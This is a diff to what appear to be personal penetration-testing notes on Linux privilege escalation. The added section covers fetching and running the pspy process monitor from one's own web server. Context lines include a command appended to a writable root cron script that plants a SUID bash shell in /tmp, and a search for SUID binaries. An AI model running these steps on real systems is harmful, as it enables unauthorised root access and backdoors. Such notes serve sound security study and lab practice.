@@ -197,6 +197,15 @@ Check file perms of any cron jobs u find (ls -la filename.sh)<br>
 If write permissions can overwrite file<br>
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> filename.sh<br>
 <br>
+<br>
+<h2> checking processes running as root </h2> <br>
+directory on my liniux called pspy <br>
+start web server<br>
+curl host and /pspy -o pspy <br>
+chmod 777 pspy <br>
+./pspy -d <br>
+look for processes running as UID=0 that sound interesting and cat and take a look, see if you can edit, modify <br>
+<br>
 <h2>Path</h2><br>
 find / -perm -u=s -exec ls -l {} \; 2>/dev/null<br>
 Look for non linux binaries<br>
